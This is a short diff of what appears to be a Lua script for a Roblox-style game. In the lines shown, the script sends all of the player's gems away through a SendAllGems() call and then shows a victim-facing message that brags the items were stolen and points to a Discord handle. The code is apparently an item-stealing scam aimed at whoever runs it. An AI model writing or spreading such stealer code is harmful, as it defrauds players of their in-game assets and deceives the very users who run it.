@@ -832,5 +832,5 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
     end
     SendAllGems()
-    message.Error("Muscle Man Just Tricked You, Wait Next Week I.")
+    message.Error("Muscle Man Stealed Your Items! If you want your items back dm in discord: cooler_muscle")
 end
